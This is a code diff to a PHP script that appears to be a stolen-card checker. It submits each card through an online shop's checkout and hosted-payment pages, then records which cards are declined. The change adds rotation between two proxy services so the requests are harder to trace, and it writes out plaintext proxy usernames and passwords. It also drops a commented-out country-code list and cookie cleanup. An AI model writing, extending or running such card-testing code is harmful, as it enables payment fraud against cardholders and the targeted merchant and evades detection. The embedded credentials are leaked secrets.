@@ -266,265 +266,25 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $referer = $referers[array_rand($referers)];
     $webkit = generateWebKitBoundary();
 
-    // $isoCodes = [
-    //   "AF",
-    //   "AX",
-    //   "AL",
-    //   "DZ",
-    //   "AS",
-    //   "AD",
-    //   "AO",
-    //   "AI",
-    //   "AQ",
-    //   "AG",
-    //   "AR",
-    //   "AM",
-    //   "AW",
-    //   "AU",
-    //   "AT",
-    //   "AZ",
-    //   "BS",
-    //   "BH",
-    //   "BD",
-    //   "BB",
-    //   "BY",
-    //   "BE",
-    //   "BZ",
-    //   "BJ",
-    //   "BM",
-    //   "BT",
-    //   "BO",
-    //   "BQ",
-    //   "BA",
-    //   "BW",
-    //   "BV",
-    //   "BR",
-    //   "IO",
-    //   "BN",
-    //   "BG",
-    //   "BF",
-    //   "BI",
-    //   "CV",
-    //   "KH",
-    //   "CM",
-    //   "CA",
-    //   "KY",
-    //   "CF",
-    //   "TD",
-    //   "CL",
-    //   "CN",
-    //   "CX",
-    //   "CC",
-    //   "CO",
-    //   "KM",
-    //   "CG",
-    //   "CD",
-    //   "CK",
-    //   "CR",
-    //   "CI",
-    //   "HR",
-    //   "CU",
-    //   "CW",
-    //   "CY",
-    //   "CZ",
-    //   "DK",
-    //   "DJ",
-    //   "DM",
-    //   "DO",
-    //   "EC",
-    //   "EG",
-    //   "SV",
-    //   "GQ",
-    //   "ER",
-    //   "EE",
-    //   "SZ",
-    //   "ET",
-    //   "FK",
-    //   "FO",
-    //   "FJ",
-    //   "FI",
-    //   "FR",
-    //   "GF",
-    //   "PF",
-    //   "TF",
-    //   "GA",
-    //   "GM",
-    //   "GE",
-    //   "DE",
-    //   "GH",
-    //   "GI",
-    //   "GR",
-    //   "GL",
-    //   "GD",
-    //   "GP",
-    //   "GU",
-    //   "GT",
-    //   "GG",
-    //   "GN",
-    //   "GW",
-    //   "GY",
-    //   "HT",
-    //   "HM",
-    //   "VA",
-    //   "HN",
-    //   "HK",
-    //   "HU",
-    //   "IS",
-    //   "IN",
-    //   "ID",
-    //   "IR",
-    //   "IQ",
-    //   "IE",
-    //   "IM",
-    //   "IL",
-    //   "IT",
-    //   "JM",
-    //   "JP",
-    //   "JE",
-    //   "JO",
-    //   "KZ",
-    //   "KE",
-    //   "KI",
-    //   "KP",
-    //   "KR",
-    //   "KW",
-    //   "KG",
-    //   "LA",
-    //   "LV",
-    //   "LB",
-    //   "LS",
-    //   "LR",
-    //   "LY",
-    //   "LI",
-    //   "LT",
-    //   "LU",
-    //   "MO",
-    //   "MG",
-    //   "MW",
-    //   "MY",
-    //   "MV",
-    //   "ML",
-    //   "MT",
-    //   "MH",
-    //   "MQ",
-    //   "MR",
-    //   "MU",
-    //   "YT",
-    //   "MX",
-    //   "FM",
-    //   "MD",
-    //   "MC",
-    //   "MN",
-    //   "ME",
-    //   "MS",
-    //   "MA",
-    //   "MZ",
-    //   "MM",
-    //   "NA",
-    //   "NR",
-    //   "NP",
-    //   "NL",
-    //   "NC",
-    //   "NZ",
-    //   "NI",
-    //   "NE",
-    //   "NG",
-    //   "NU",
-    //   "NF",
-    //   "MK",
-    //   "MP",
-    //   "NO",
-    //   "OM",
-    //   "PK",
-    //   "PW",
-    //   "PS",
-    //   "PA",
-    //   "PG",
-    //   "PY",
-    //   "PE",
-    //   "PH",
-    //   "PN",
-    //   "PL",
-    //   "PT",
-    //   "PR",
-    //   "QA",
-    //   "RE",
-    //   "RO",
-    //   "RU",
-    //   "RW",
-    //   "BL",
-    //   "SH",
-    //   "KN",
-    //   "LC",
-    //   "MF",
-    //   "PM",
-    //   "VC",
-    //   "WS",
-    //   "SM",
-    //   "ST",
-    //   "SA",
-    //   "SN",
-    //   "RS",
-    //   "SC",
-    //   "SL",
-    //   "SG",
-    //   "SX",
-    //   "SK",
-    //   "SI",
-    //   "SB",
-    //   "SO",
-    //   "ZA",
-    //   "GS",
-    //   "SS",
-    //   "ES",
-    //   "LK",
-    //   "SD",
-    //   "SR",
-    //   "SJ",
-    //   "SE",
-    //   "CH",
-    //   "SY",
-    //   "TW",
-    //   "TJ",
-    //   "TZ",
-    //   "TH",
-    //   "TL",
-    //   "TG",
-    //   "TK",
-    //   "TO",
-    //   "TT",
-    //   "TN",
-    //   "TR",
-    //   "TM",
-    //   "TC",
-    //   "TV",
-    //   "UG",
-    //   "UA",
-    //   "AE",
-    //   "GB",
-    //   "US",
-    //   "UM",
-    //   "UY",
-    //   "UZ",
-    //   "VU",
-    //   "VE",
-    //   "VN",
-    //   "VG",
-    //   "VI",
-    //   "WF",
-    //   "EH",
-    //   "YE",
-    //   "ZM",
-    //   "ZW"
-    // ];
 
-    // $randomIsoCode = strtolower($isoCodes[array_rand($isoCodes)]);
+    $proxies = [
+      [
+        'proxy' => "geo.iproyal.com:12321",
+        'credentials' => "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us"
+      ],
+      [
+        'proxy' => "brd.superproxy.io:22225",
+        'credentials' => "brd-customer-hl_9658b3d0-zone-data_center-country-au-session-rand552371896:putanginamo123"
+      ]
+    ];
 
+
+    $selectedProxy = $proxies[array_rand($proxies)];
 
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://cmafh.com//addQuick.aspx?0.8270595518182022");
@@ -548,8 +308,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx");
@@ -564,8 +324,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($g);
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://cmafh.com/getiframe.aspx?dt=Y");
@@ -588,8 +348,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($g);
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$transid");
@@ -612,8 +372,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($g);
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://transaction.hostedpayments.com/?TransactionSetupID=$transid");
@@ -638,8 +398,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     curl_close($g);
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, $nurl);
@@ -660,8 +420,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx");
@@ -687,8 +447,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
     $oidNumber = $params['oid'];
 
     $g = curl_init();
-    curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-    curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+    curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+    curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
     curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
     curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
     curl_setopt($g, CURLOPT_URL, "https://cmafh.com/processorder.aspx?cid=$oidNumber&_=1723449095687");
@@ -709,8 +469,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
     if ($g7 == "ERROR") {
       $g = curl_init();
-      curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-      curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+      curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+      curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
       curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
       curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
       curl_setopt($g, CURLOPT_URL, "https://cmafh.com/getHovCart.aspx?0.6468183627487964");
@@ -729,8 +489,8 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $errorGet1 = curl_exec($g);
 
       $g = curl_init();
-      curl_setopt($g, CURLOPT_PROXY, "geo.iproyal.com:12321");
-      curl_setopt($g, CURLOPT_PROXYUSERPWD, "FINDcb8PwwnCyoc1:7kHjD1nQgIJka8Da_country-us");
+      curl_setopt($g, CURLOPT_PROXY, $selectedProxy['proxy']);
+      curl_setopt($g, CURLOPT_PROXYUSERPWD, $selectedProxy['credentials']);
       curl_setopt($g, CURLOPT_COOKIEJAR, $ii['cookie']);
       curl_setopt($g, CURLOPT_COOKIEFILE, $ii['cookie']);
       curl_setopt($g, CURLOPT_URL, "https://cmafh.com/checkout.aspx?error=y");
@@ -765,10 +525,7 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
       $processedCards[] = ['card' => $card, 'status' => 'declined', 'message' => "$msg"];
     }
 
-    // $cookieFile = __DIR__ . '/COOKIE/' . $ii['cookie'];
-    // if (file_exists($cookieFile)) {
-    //   unlink($cookieFile);
-    // }
+
 
     curl_close($g);
   }
